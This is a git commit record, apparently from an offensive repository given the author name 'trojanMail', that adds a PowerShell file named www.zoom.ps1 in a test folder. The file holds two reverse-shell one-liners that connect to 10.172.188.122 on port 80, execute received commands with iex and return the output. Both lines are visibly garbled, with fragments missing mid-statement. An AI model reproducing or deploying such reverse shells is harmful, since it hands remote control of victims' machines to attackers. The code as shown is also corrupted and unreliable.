e61ef6094db63257cc637ce8f24fc42cdb72ab91
trojanMail <ray13alexander@gmail.com>
2022-02-26 20:36:24 -0600

    added oneline if needed

---
+++ test/www.zoom.ps1
@@ -0,0 +1,3 @@
+$client = New-Object System.Net.Sockets.TCPClient('10.172.188.122',80);$stream = $client.GetStream();[byte[]]$bytes =IEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwdam.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient('10.172.188.122',80)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read(iex $d 2>&1));$sm.Write($st,0,$st.Length)}
